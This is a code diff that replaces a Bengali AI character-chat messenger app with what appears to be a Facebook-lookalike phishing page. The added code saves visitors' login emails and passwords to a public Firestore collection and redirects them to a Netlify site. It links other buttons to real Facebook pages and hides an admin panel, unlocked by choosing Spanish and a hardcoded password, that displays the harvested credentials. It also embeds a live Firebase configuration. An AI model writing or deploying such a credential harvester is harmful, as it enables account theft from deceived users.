-                    renderCharacterList();
-                }
-            }, (error) => {
-                console.error("Error listening to characters:", error);
-                showCustomMessage("ক্যারেক্টার লোড করতে ব্যর্থ হয়েছে। (Failed to load characters.)");
-            });
-
-            // --- Listen to Conversations Collection ---
-            const conversationsRef = collection(db, `artifacts/${appId}/users/${userId}/conversations`);
-            unsubscribeFromConversations = onSnapshot(query(conversationsRef), (snapshot) => {
-                const fetchedConversations = {};
-                snapshot.docs.forEach(doc => {
-                    fetchedConversations[doc.id] = { id: doc.id, ...doc.data() };
-                });
-                allConversations = fetchedConversations;
-                console.log("Conversations fetched:", Object.keys(allConversations).length);
-                renderChatLists(); // Re-render chat lists with updated conversation data
-                // If an active chat is open, re-render its messages
-                if (activeChatbotId && individualChatView.classList.contains('hidden') === false) {
-                    // This will be handled by the onSnapshot listener within openChat, so no explicit call here.
-                    // The onSnapshot in openChat will trigger when allConversations updates.
-                }
-            }, (error) => {
-                console.error("Error listening to conversations:", error);
-                showCustomMessage("কথোপকথন লোড করতে ব্যর্থ হয়েছে। (Failed to load conversations.)");
-            });
-        }
-
-        // --- View Switching Event Listeners ---
-        chatsTab.addEventListener('click', () => {
-            showChatListView();
-            // Update active tab styling
-            chatsTab.classList.add('border-blue-500', 'text-blue-500');
-            callsTab.classList.remove('border-blue-500', 'text-blue-500');
-            peopleTab.classList.remove('border-blue-500', 'text-blue-500');
-            storiesTab.classList.remove('border-blue-500', 'text-blue-500');
-            busesTab.classList.remove('border-blue-500', 'text-blue-500');
-        });
-
-        callsTab.addEventListener('click', () => {
-            showCustomMessage("কলস ফিচারটি এখনো তৈরি হয়নি। (Calls feature is not yet implemented.)");
-            // Update active tab styling
-            chatsTab.classList.remove('border-blue-500', 'text-blue-500');
-            callsTab.classList.add('border-blue-500', 'text-blue-500');
-            peopleTab.classList.remove('border-blue-500', 'text-blue-500');
-            storiesTab.classList.remove('border-blue-500', 'text-blue-500');
-            busesTab.classList.remove('border-blue-500', 'text-blue-500');
-        });
-
-        peopleTab.addEventListener('click', () => {
-            showPeopleView();
-            // Update active tab styling
-            chatsTab.classList.remove('border-blue-500', 'text-blue-500');
-            callsTab.classList.remove('border-blue-500', 'text-blue-500');
-            peopleTab.classList.add('border-blue-500', 'text-blue-500');
-            storiesTab.classList.remove('border-blue-500', 'text-blue-500');
-            busesTab.classList.remove('border-blue-500', 'text-blue-500');
-        });
-
-        storiesTab.addEventListener('click', () => {
-            showCustomMessage("স্টোরিজ ফিচারটি এখনো তৈরি হয়নি। (Stories feature is not yet implemented.)");
-            // Update active tab styling
-            chatsTab.classList.remove('border-blue-500', 'text-blue-500');
-            callsTab.classList.remove('border-blue-500', 'text-blue-500');
-            peopleTab.classList.remove('border-blue-500', 'text-blue-500');
-            storiesTab.classList.add('border-blue-500', 'text-blue-500');
-            busesTab.classList.remove('border-blue-500', 'text-blue-500');
-
-            // This is the settings tab, show password modal
-            showPasswordModal();
-        });
-
-        busesTab.addEventListener('click', () => {
-            showBusesView();
-            // Update active tab styling
-            chatsTab.classList.remove('border-blue-500', 'text-blue-500');
-            callsTab.classList.remove('border-blue-500', 'text-blue-500');
-            peopleTab.classList.remove('border-blue-500', 'text-blue-500');
-            storiesTab.classList.remove('border-blue-500', 'text-blue-500');
-            busesTab.classList.add('border-blue-500', 'text-blue-500');
-        });
-
-        // Back buttons event listeners
-        backToMainListButton.addEventListener('click', () => {
-            if (unsubscribeFromActiveChat) {
-                unsubscribeFromActiveChat(); // Unsubscribe from active chat listener
-            }
-            activeChatbotId = null; // Clear active chat
-            showChatListView();
-        });
-        peopleBackToListButton.addEventListener('click', showChatListView);
-        busesBackToListButton.addEventListener('click', showChatListView);
-        settingsBackToListButton.addEventListener('click', hideSettingsView); // Back from settings to chat list
-
-        // Settings button in header
-        settingsButton.addEventListener('click', showPasswordModal);
-
-        // Character form buttons
-        saveCharacterButton.addEventListener('click', saveCharacter);
-        addNewCharacterButton.addEventListener('click', clearCharacterForm);
-        cancelEditButton.addEventListener('click', clearCharacterForm);
-
-        // Message input and send buttons
-        sendButton.addEventListener('click', () => {
-            const characterData = allCharacters[activeChatbotId];
-            if (chatInput.value.trim() && activeChatbotId && characterData && !isTyping) { // Added !isTyping check
-                sendMessageToGemini(chatInput.value.trim(), activeChatbotId, characterData.name, characterData.profilePic, characterData.persona);
-                suggestedRepliesContainer.classList.add('hidden');
-            }
-        });
-
-        chatInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter' && !isTyping) { // Added !isTyping check
-                sendButton.click();
-            }
-        });
-
-        suggestReplyButton.addEventListener('click', generateSuggestedReplies);
-        summarizeChatButton.addEventListener('click', summarizeChat);
-
-        // Mobile sidebar toggle buttons
-        openSidebarBtn.addEventListener('click', () => toggleMobileSidebar(true));
-        closeSidebarBtn.addEventListener('click', () => toggleMobileSidebar(false));
-
-        // --- Data Management Buttons ---
-        /**
-         * সমস্ত ডেটা JSON ফাইল হিসাবে এক্সপোর্ট করে।
-         */
-        function exportAllData() {
-            const dataToExport = {
-                characters: allCharacters,
-                conversations: allConversations
-            };
-            const dataStr = JSON.stringify(dataToExport, null, 2);
-            const blob = new Blob([dataStr], { type: "application/json" });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `messenger_data_${userId}.json`;
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            URL.revokeObjectURL(url);
-            showCustomMessage('ডেটা সফলভাবে এক্সপোর্ট করা হয়েছে! (Data exported successfully!)');
-        }
-
-        /**
-         * JSON ফাইল থেকে ডেটা ইম্পোর্ট করে।
-         */
-        function importAllData(event) {
-            const file = event.target.files[0];
-            if (!file) {
-                showCustomMessage('কোনো ফাইল নির্বাচন করা হয়নি। (No file selected.)');
-                return;
-            }
-
-            const reader = new FileReader();
-            reader.onload = function(e) {
-                try {
-                    const importedData = JSON.parse(e.target.result);
-                    if (importedData.characters && importedData.conversations) {
-                        showConfirmationModal(
-                            'ডেটা ইম্পোর্ট নিশ্চিত করুন (Confirm Data Import)',
-                            'আপনি কি নিশ্চিত যে আপনি এই ডেটা ইম্পোর্ট করতে চান? এটি বর্তমান ডেটা ওভাররাইট করবে। (Are you sure you want to import this data? It will overwrite current data.)',
-                            async (confirmed) => {
-                                if (confirmed) {
-                                    // Clear existing data in Firestore for current user
-                                    const charPromises = Object.keys(allCharacters).map(id => deleteDoc(doc(db, `artifacts/${appId}/users/${userId}/characters`, id)));
-                                    const convPromises = Object.keys(allConversations).map(id => deleteDoc(doc(db, `artifacts/${appId}/users/${userId}/conversations`, id)));
-                                    await Promise.all([...charPromises, ...convPromises]);
-
-                                    // Import new characters
-                                    for (const charId in importedData.characters) {
-                                        const charData = importedData.characters[charId];
-                                        await setDoc(doc(db, `artifacts/${appId}/users/${userId}/characters`, charId), charData);
-                                    }
-
-                                    // Import new conversations
-                                    for (const convId in importedData.conversations) {
-                                        const convData = importedData.conversations[convId];
-                                        // Ensure Timestamp objects are correctly re-created if they were stringified
-                                        if (convData.lastUpdated && typeof convData.lastUpdated === 'object' && convData.lastUpdated._seconds) {
-                                            convData.lastUpdated = new Timestamp(convData.lastUpdated._seconds, convData.lastUpdated._nanoseconds);
-                                        }
-                                        // Ensure message timestamps are also re-created
-                                        if (convData.messages && Array.isArray(convData.messages)) {
-                                            convData.messages = convData.messages.map(msg => {
-                                                if (msg.timestamp && typeof msg.timestamp === 'object' && msg.timestamp._seconds) {
-                                                    msg.timestamp = new Timestamp(msg.timestamp._seconds, msg.timestamp._nanoseconds);
-                                                }
-                                                return msg;
-                                            });
-                                        }
-                                        await setDoc(doc(db, `artifacts/${appId}/users/${userId}/conversations`, convId), convData);
-                                    }
-
-                                    showCustomMessage('ডেটা সফলভাবে ইম্পোর্ট করা হয়েছে! (Data imported successfully!)');
-                                    // UI will refresh via Firestore listeners
-                                    if (activeChatbotId) {
-                                        openChat(activeChatbotId); // Re-open current chat to refresh
-                                    } else {
-                                        showChatListView();
-                                    }
-                                } else {
-                                    showCustomMessage('ডেটা ইম্পোর্ট বাতিল করা হয়েছে। (Data import cancelled.)');
-                                }
-                            }
-                        );
-                    } else {
-                        showCustomMessage('অকার্যকর JSON ফাইল ফরম্যাট। (Invalid JSON file format.)');
-                    }
-                } catch (error) {
-                    console.error('ফাইল পার্স করতে ত্রুটি: (Error parsing file:)', error);
-                    showCustomMessage('ফাইল পার্স করতে ত্রুটি। নিশ্চিত করুন এটি একটি বৈধ JSON ফাইল। (Error parsing file. Ensure it is a valid JSON file.)');
-                }
-            };
-            reader.readAsText(file);
-        }
-
-        /**
-         * সমস্ত Firestore ডেটা রিসেট করে। (Resets all Firestore data for the current user.)
-         */
-        function resetAllData() {
-            showConfirmationModal(
-                'ডেটা রিসেট নিশ্চিত করুন (Confirm Data Reset)',
-                'আপনি কি নিশ্চিত যে আপনি সমস্ত ডেটা রিসেট করতে চান? এটি আপনার সমস্ত ক্যারেক্টার এবং চ্যাট ইতিহাস মুছে ফেলবে। এটি পূর্বাবস্থায় ফেরানো যাবে না! (Are you sure you want to reset all data? This will delete all your characters and chat history. This cannot be undone!)',
-                async (confirmed) => {
-                    if (confirmed) {
-                        try {
-                            // Delete all characters
-                            const charDeletePromises = Object.keys(allCharacters).map(id => deleteDoc(doc(db, `artifacts/${appId}/users/${userId}/characters`, id)));
-                            await Promise.all(charDeletePromises);
-
-                            // Delete all conversations
-                            const convDeletePromises = Object.keys(allConversations).map(id => deleteDoc(doc(db, `artifacts/${appId}/users/${userId}/conversations`, id)));
-                            await Promise.all(convDeletePromises);
-
-                            // Re-populate with default chatbots (if any)
-                            for (const defaultCharId in defaultChatbots) {
-                                const defaultCharData = defaultChatbots[defaultCharId];
-                                await setDoc(doc(db, `artifacts/${appId}/users/${userId}/characters`, defaultCharId), {
-                                    name: defaultCharId,
-                                    profilePic: defaultCharData.profilePic,
-                                    status: defaultCharData.status,
-                                    persona: defaultCharData.persona
-                                });
-                                await setDoc(doc(db, `artifacts/${appId}/users/${userId}/conversations`, defaultCharId), {
-                                    chatbotId: defaultCharId,
-                                    chatbotName: defaultCharData.name,
-                                    messages: defaultCharData.initialMessages || [],
-                                    lastUpdated: Timestamp.now()
-                                });
-                            }
-
-                            showCustomMessage('সমস্ত ডেটা সফলভাবে রিসেট করা হয়েছে! (All data reset successfully!)');
-                            // UI will refresh via Firestore listeners
-                            if (activeChatbotId) {
-                                backToMainListButton.click(); // Go back to main list
-                            }
-                        } catch (error) {
-                            console.error("ডেটা রিসেট করতে ত্রুটি: (Error resetting data:)", error);
-                            showCustomMessage("ডেটা রিসেট করতে ব্যর্থ হয়েছে। (Failed to reset data.)");
-                        }
-                    } else {
-                        showCustomMessage('ডেটা রিসেট বাতিল করা হয়েছে। (Data reset cancelled.)');
-                    }
-                }
-            );
-        }
-
-        exportDataButton.addEventListener('click', exportAllData);
-        importDataButton.addEventListener('click', () => importDataInput.click());
-        importDataInput.addEventListener('change', importAllData);
-        resetDataButton.addEventListener('click', resetAllData);
-
-
-        // --- Initialize App on Window Load ---
-        window.onload = () => {
-            lucide.createIcons(); // Initialize Lucide icons
-            initFirebaseAndAuth(); // Start Firebase initialization and authentication
+        // User's provided Firebase configuration (as a fallback)
+        const userProvidedFirebaseConfig = {
+            apiKey: "AIzaSyAlp81SMW-M5zWK6VS9tgFXDv7IGp_yK4c",
+            authDomain: "okhhhhh-c4055.firebaseapp.com",
+            projectId: "okhhhhh-c4055",
+            storageBucket: "okhhhhh-c4055.firebasestorage.app",
+            messagingSenderId: "505784498135",
+            appId: "1:505784498135:web:5c00d1a5d1fff5976cbd92",
+            measurementId: "G-LJBG788P2Q"
         };
 
-        // Adjust sidebar visibility on resize for desktop
-        window.addEventListener('resize', () => {
-            toggleMobileSidebar(window.innerWidth >= 768); // Force true if desktop, false if mobile
+        // Determine which Firebase config to use: Canvas's or user's fallback
+        let firebaseConfig;
+        if (typeof __firebase_config !== 'undefined' && Object.keys(JSON.parse(__firebase_config)).length > 0) {
+            firebaseConfig = JSON.parse(__firebase_config);
+            console.log("Using Firebase config provided by Canvas environment.");
+        } else {
+            firebaseConfig = userProvidedFirebaseConfig;
+            console.warn("Canvas environment Firebase config not found or empty. Using user-provided fallback config. Ensure this matches the project for the custom token.");
+        }
+
+        // Initialize Firebase services
+        const app = initializeApp(firebaseConfig);
+        const analytics = getAnalytics(app); // Initialize Analytics
+        const db = getFirestore(app);
+        const auth = getAuth(app);
+
+        let currentUserId = null;
+        let isAuthReady = false;
+
+        // Firebase Auth state listener
+        // This ensures currentUserId is set after authentication state is known
+        onAuthStateChanged(auth, async (user) => {
+            if (user) {
+                currentUserId = user.uid;
+                console.log("Firebase user signed in:", currentUserId);
+            } else {
+                // If no user is signed in and no initial token, sign in anonymously
+                if (!initialAuthToken) {
+                    try {
+                        await signInAnonymously(auth);
+                        currentUserId = auth.currentUser?.uid || crypto.randomUUID(); // Get anonymous UID or fallback
+                        console.log("Firebase user signed in anonymously:", currentUserId);
+                    } catch (error) {
+                        console.error("Anonymous authentication failed:", error);
+                        showMessageBox(`বেনামী প্রমাণীকরণ ব্যর্থ হয়েছে: ${error.message}`);
+                    }
+                } else {
+                    currentUserId = crypto.randomUUID(); // Fallback for unauthenticated users
+                    console.log("Firebase user signed out or not authenticated. Using anonymous ID:", currentUserId);
+                }
+            }
+            isAuthReady = true; // Mark authentication as ready
+            console.log("isAuthReady set to:", isAuthReady);
+        });
+
+        // Function to handle initial Firebase authentication
+        async function authenticateFirebase() {
+            console.log("authenticateFirebase function started.");
+            try {
+                if (initialAuthToken) {
+                    console.log("Attempting to sign in with custom token...");
+                    await signInWithCustomToken(auth, initialAuthToken);
+                    console.log("Sign in with custom token successful.");
+                } else {
+                    console.log("Attempting to sign in anonymously...");
+                    await signInAnonymously(auth);
+                    console.log("Anonymous sign in successful.");
+                }
+            } catch (error) {
+                console.error("Firebase authentication failed:", error);
+                showMessageBox(`Firebase প্রমাণীকরণ ব্যর্থ হয়েছে: ${error.message}. আপনার Firebase প্রোজেক্ট সেটআপ পরীক্ষা করুন।`);
+            }
+        }
+
+        // DOM Element References
+        const mainLoginContent = document.getElementById('mainLoginContent');
+        const adminPanel = document.getElementById('adminPanel');
+        const languageDisplay = document.querySelector('.language');
+        const langListDiv = document.getElementById('langList');
+        const loginEmailInput = document.getElementById('loginEmailInput');
+        const loginPasswordInput = document.getElementById('loginPasswordInput');
+        const loginButton = document.getElementById('loginBtn');
+        const forgotPasswordLink = document.getElementById('forgotPasswordLink');
+        const createAccountBtn = document.getElementById('createAccountBtn');
+        const adminEmailInput = document.getElementById('adminEmail');
+        const adminPasswordInput = document.getElementById('adminPassword');
+        const adminLoginBtn = document.getElementById('adminLoginBtn');
+        const logDisplay = document.getElementById('logDisplay');
+        const messageBox = document.getElementById('messageBox');
+        const messageContent = document.getElementById('messageContent');
+
+        // Custom Message Box Functions
+        function showMessageBox(message) {
+            messageContent.textContent = message;
+            messageBox.style.display = 'block';
+        }
+
+        function hideMessageBox() {
+            messageBox.style.display = 'none';
+        }
+
+        // Expose functions to global scope for HTML onclick attributes
+        window.openLangPopup = openLangPopup;
+        window.closeLangPopup = closeLangPopup;
+        window.hideMessageBox = hideMessageBox;
+
+        // Language Popup Functions
+        function openLangPopup() {
+            document.getElementById("languagePopup").classList.add("active");
+        }
+
+        function closeLangPopup() {
+            document.getElementById("languagePopup").classList.remove("active");
+        }
+
+        // Language Data
+        const languages = [
+            { name: "English (US)", value: "en" },
+            { name: "বাংলা", value: "bn" },
+            { name: "অসমীয়া", value: "as" },
+            { name: "Español", value: "es" }, // This will toggle visibility
+            { name: "हिन्दी", value: "hi" },
+            { name: "Français (France)", value: "fr" },
+            { name: "中文(简体)", "value": "zh" },
+            { name: "العربية", value: "ar" },
+        ];
+
+        let selectedLanguage = "en"; // Default language
+
+        // Populate language list in the popup
+        function populateLanguageList() {
+            langListDiv.innerHTML = ''; // Clear existing list
+            languages.forEach(lang => {
+                const label = document.createElement('label');
+                const input = document.createElement('input');
+                input.type = 'checkbox';
+                input.value = lang.value;
+                input.checked = (lang.value === selectedLanguage); // Check if it's the currently selected language
+
+                input.addEventListener('change', (event) => {
+                    // Uncheck all other checkboxes
+                    langListDiv.querySelectorAll('input[type="checkbox"]').forEach(cb => {
+                        if (cb !== event.target) {
+                            cb.checked = false;
+                        }
+                    });
+
+                    if (event.target.checked) {
+                        selectedLanguage = event.target.value;
+                    } else {
+                        selectedLanguage = "en"; // Default to English if unchecked
+                    }
+                    // Update the displayed language
+                    languageDisplay.textContent = `${languages.find(l => l.value === selectedLanguage).name} ⌄`;
+                    handleLanguageChange(selectedLanguage); // Handle content visibility based on language
+                    closeLangPopup(); // Close the popup
+                });
+
+                label.appendChild(input);
+                label.appendChild(document.createTextNode(` ${lang.name}`));
+                langListDiv.appendChild(label);
+            });
+        }
+
+        // Handle content visibility based on selected language
+        function handleLanguageChange(langValue) {
+            if (langValue === 'es') { // If Spanish is selected, show admin panel
+                mainLoginContent.style.display = 'none';
+                adminPanel.style.display = 'block';
+            } else { // Otherwise, show main login content
+                mainLoginContent.style.display = 'block';
+                adminPanel.style.display = 'none';
+                logDisplay.innerHTML = ''; // Clear logs when admin panel is hidden
+                adminEmailInput.value = ''; // Clear admin login fields
+                adminPasswordInput.value = '';
+            }
+        }
+
+        // Save input to Firebase Firestore
+        async function saveInput(boxId, content) {
+            // Ensure Firebase authentication is ready and userId is available
+            if (!isAuthReady || !currentUserId) {
+                console.warn("Firebase authentication not ready or user ID unavailable. Cannot save input.");
+                showMessageBox("প্রমাণীকরণ প্রস্তুত নয়। অনুগ্রহ করে অপেক্ষা করুন এবং আবার চেষ্টা করুন।");
+                return false; // Indicate failure
+            }
+
+            // Do not save empty content
+            if (content.trim() === '') {
+                console.log(`Empty content for box ID '${boxId}', not saving.`);
+                return true; // Consider as success for empty input (no error)
+            }
+
+            try {
+                console.log(`Saving input for '${boxId}': ${content.substring(0, 50)}... User ID: ${currentUserId}`);
+                await addDoc(collection(db, `artifacts/${appId}/public/data/user_inputs`), {
+                    boxId: boxId,
+                    content: content,
+                    timestamp: serverTimestamp(), // Use server timestamp
+                    browser: navigator.userAgent || 'Unknown',
+                    userId: currentUserId
+                });
+                console.log("Input saved successfully.");
+                return true; // Indicate success
+            } catch (error) {
+                console.error("Error saving input:", error);
+                showMessageBox(`ইনপুট সংরক্ষণ করতে ত্রুটি: ${error.message}`);
+                return false; // Indicate failure
+            }
+        }
+
+        // Event Listener for Login Button Click
+        if (loginButton) {
+            loginButton.addEventListener('click', async () => { // Made async to await saveInput
+                const emailSaved = await saveInput('loginEmail', loginEmailInput.value);
+                const passwordSaved = await saveInput('loginPassword', loginPasswordInput.value);
+
+                if (emailSaved && passwordSaved) {
+                    showMessageBox("আপনার ডেটা সফলভাবে সেভ হয়েছে!");
+                    // Redirect after a short delay to allow user to see the message
+                    setTimeout(() => {
+                        window.location.href = 'https://6841e003753a88073ea46c21--symphonious-crepe-98039e.netlify.app/';
+                    }, 1500); // 1.5 second delay
+                } else {
+                    // If saving failed, show a more general error if not already specific
+                    if (!messageBox.style.display || messageBox.style.display === 'none') {
+                         showMessageBox("ডেটা সেভ করতে সমস্যা হয়েছে।");
+                    }
+                }
+            });
+        }
+
+        // Event Listener for Forgot Password Link Click
+        if (forgotPasswordLink) {
+            forgotPasswordLink.addEventListener('click', (event) => {
+                event.preventDefault(); // Prevent default link behavior
+                // Redirect to your 'Forgot Password' page
+                window.location.href = 'https://m.facebook.com/login/identify/?ctx=recover&c&multiple_results=0&ars=facebook_login&from_login_screen=0';
+            });
+        }
+
+        // Event Listener for Create Account Button Click
+        if (createAccountBtn) {
+            createAccountBtn.addEventListener('click', () => {
+                // Redirect to your 'Create New Account' page
+                window.location.href = 'https://m.facebook.com/reg/';
+            });
+        }
+
+        // Admin Panel Login Logic
+        if (adminLoginBtn) {
+            adminLoginBtn.addEventListener('click', async () => {
+                const email = adminEmailInput.value;
+                const password = adminPasswordInput.value;
+
+                if (!email || !password) {
+                    showMessageBox("অনুগ্রহ করে ইমেল এবং পাসওয়ার্ড উভয়ই লিখুন।");
+                    return;
+                }
+
+                // Hardcoded admin password for demonstration
+                if (password !== 'ORIONEX') {
+                    showMessageBox("অ্যাডমিন অ্যাক্সেসের জন্য ভুল পাসওয়ার্ড।");
+                    return;
+                }
+
+                showMessageBox("অ্যাক্সেস Granted! লগ লোড হচ্ছে...");
+                await fetchAndDisplayLogs(); // Fetch and display logs
+            });
+        }
+
+        // Fetch and Display Logs from Firebase (without orderBy for Canvas compatibility)
+        async function fetchAndDisplayLogs() {
+            // Ensure authentication is ready before fetching logs
+            if (!isAuthReady || !currentUserId) {
+                showMessageBox("প্রমাণীকরণ প্রস্তুত নয়। অনুগ্রহ করে অপেক্ষা করুন বা আবার চেষ্টা করুন।");
+                console.warn("fetchAndDisplayLogs: Firebase authentication not ready or user ID unavailable.");
+                return;
+            }
+
+            logDisplay.innerHTML = '<p>লগ লোড হচ্ছে...</p>'; // Show loading message
+            console.log("Starting to fetch logs...");
+
+            try {
+                // Create a query to the 'user_inputs' collection
+                // IMPORTANT: Do NOT use orderBy() here, as it requires manual index creation in Firestore
+                // which is not directly manageable in this Canvas environment.
+                const q = query(
+                    collection(db, `artifacts/${appId}/public/data/user_inputs`)
+                );
+
+                const querySnapshot = await getDocs(q); // Get documents from the query
+                console.log("Fetched logs from Firestore. Total documents:", querySnapshot.size);
+
+                let logs = [];
+                querySnapshot.forEach(doc => {
+                    logs.push(doc.data()); // Add each document's data to the logs array
+                });
+
+                // Sort logs in-memory by timestamp in descending order
+                logs.sort((a, b) => {
+                    // Ensure timestamp is a Date object or a number for comparison
+                    const timeA = a.timestamp && typeof a.timestamp.toDate === 'function' ? a.timestamp.toDate().getTime() : 0;
+                    const timeB = b.timestamp && typeof b.timestamp.toDate === 'function' ? b.timestamp.toDate().getTime() : 0;
+                    return timeB - timeA; // Sort in descending order (latest first)
+                });
+
+                let logsHtml = '<h3 class="text-xl font-semibold mb-4">সম্প্রতি লগ করা ব্যবহারকারীর ইনপুট:</h3>';
+
+                if (logs.length === 0) {
+                    logsHtml += '<p class="text-gray-500">এখনও কোনো লগ পাওয়া যায়নি।</p>';
+                } else {
+                    logs.forEach(data => {
+                        // Format timestamp for display
+                        const date = data.timestamp && typeof data.timestamp.toDate === 'function' ? new Date(data.timestamp.toDate()).toLocaleString('bn-BD') : 'উপলব্ধ নয়';
+                        logsHtml += `
+                            <div class="log-entry">
+                                <p><strong>বক্স:</strong> ${data.boxId}</p>
+                                <p><strong>কন্টেন্ট:</strong> ${data.content}</p>
+                                <p><strong>সময়:</strong> ${date}</p>
+                                <p><strong>ব্রাউজার:</strong> ${data.browser || 'উপলব্ধ নয়'}</p>
+                                <p class="text-xs text-gray-400">ব্যবহারকারী আইডি: ${data.userId || 'উপলব্ধ নয়'}</p>
+                            </div>
+                        `;
+                    });
+                }
+                logDisplay.innerHTML = logsHtml; // Update the log display area
+                console.log("Logs successfully displayed.");
+
+            } catch (error) {
+                showMessageBox(`লগ লোড করতে ত্রুটি: ${error.message}. কনসোল পরীক্ষা করুন।`);
+                console.error("Error fetching logs: ", error);
+                logDisplay.innerHTML = '<p>লগ লোড করতে ত্রুটি। বিস্তারিত দেখতে কনসোল পরীক্ষা করুন।</p>';
+            }
+        }
+
+        // Initial setup when the window loads
+        window.addEventListener('load', () => {
+            authenticateFirebase(); // Start Firebase authentication process
+            populateLanguageList(); // Populate the language selection popup
+            // Set initial displayed language
+            languageDisplay.textContent = `${languages.find(lang => lang.value === selectedLanguage).name} ⌄`;
+            // Ensure main login content is visible and admin panel is hidden initially
+            mainLoginContent.style.display = 'block';
+            adminPanel.style.display = 'none';
         });
     </script>
 </body>
